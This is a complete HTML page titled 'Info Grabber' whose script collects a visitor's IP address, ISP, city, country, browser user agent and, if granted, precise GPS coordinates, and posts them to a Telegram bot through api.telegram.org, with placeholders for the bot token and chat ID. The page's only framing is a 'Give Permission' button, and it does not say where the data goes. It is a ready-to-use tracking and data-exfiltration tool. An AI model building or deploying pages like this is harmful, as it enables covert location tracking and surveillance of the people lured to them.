<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Info Grabber</title>
  <style>
    body { font-family: Arial; padding: 20px; background: #f0f0f0; }
    .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
  </style>
</head>
<body>
  <div class="box">
    <h2>Show Us Your Info</h2>
    <button onclick="collectAndSend()">Give Permission</button>
    <pre id="result">Waiting for permission...</pre>
  </div>

  <script>
    const BOT_TOKEN = "YOUR_BOT_TOKEN";
    const CHAT_ID = "YOUR_CHAT_ID";

    async function getIPInfo() {
      const res = await fetch("https://ipapi.co/json/");
      return await res.json();
    }

    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      });
    }

    async function collectAndSend() {
      document.getElementById("result").textContent = "Collecting info...";

      const ipInfo = await getIPInfo();

      // Send base info immediately
      const baseMessage = `
New Visitor Info (without precise location):
IP: ${ipInfo.ip}
ISP: ${ipInfo.org}
City: ${ipInfo.city}
Region: ${ipInfo.region}
Country: ${ipInfo.country_name}
User-Agent: ${navigator.userAgent}
Time: ${new Date().toLocaleString()}
      `;
      document.getElementById("result").textContent = baseMessage;
      await sendToTelegram(baseMessage);

      // Try to get precise location, but don't block or send if denied
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const locationMessage = `
Updated Visitor Location:
Latitude: ${position.coords.latitude}
Longitude: ${position.coords.longitude}
Accuracy: ${position.coords.accuracy} meters
Time: ${new Date().toLocaleString()}
            `;
            document.getElementById("result").textContent += "\n" + locationMessage;
            await sendToTelegram(locationMessage);
          },
          (error) => {
            // User denied or error: do nothing or log silently
            console.log("Geolocation permission denied or error.");
          }
        );
      } else {
        console.log("Geolocation not supported by browser.");
      }
    }
  </script>
</body>
</html>
